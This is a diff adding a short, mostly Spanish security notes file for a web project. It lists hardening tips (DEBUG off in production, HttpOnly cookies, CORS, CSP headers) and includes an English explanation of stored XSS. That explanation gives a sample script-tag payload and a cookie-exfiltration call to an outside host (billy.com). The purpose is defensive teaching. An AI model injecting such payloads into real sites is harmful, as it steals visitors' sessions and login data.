@@ -1,0 +1,31 @@
+SEGURIDAD
+=========
+
+- Solo enviar información crítica (partes del config, o debug de queries) con DEBUG=1
+
+- Deshabilitar el DEBUG mode en producción
+
+- [ Cookies ] Usar HttpOnly en el front 
+
+Let’s walk through a concrete example:
+
+NaiveSite allows you to enter your name, which is output as is on your profile page.
+Billy the Kid enters his name as Billy <script>alert('Hello Bob!')</script>.
+Anyone who visits Billy’s profile page gets some HTML including the unescaped script tag, which their browser runs.
+
+If the alert() were changed to something more malicious, like sendCookies('https://billy.com/cookie-monster'), Billy may now be collecting the unsuspecting visitor’s login information.
+
+Side note: it isn’t quite this simple, as login cookies are usually marked HttpOnly, which means they’re not accessible to JavaScript. But this is NaiveSite, so it’s likely they made both an XSS mistake and a cookie one.
+
+- Limitar CORS al menos donde se pueda.
+
+- Content Security Policy (CSP)
+
+    X-Content-Security-Policy: script-src 'self'
+
+- Leer sobre X-XSS y el header
+
+    X-XSS-Protection
+
+https://www.cloudways.com/blog/prevent-xss-in-php/
+https://stackoverflow.com/questions/9090577/what-is-the-http-header-x-xss-protection
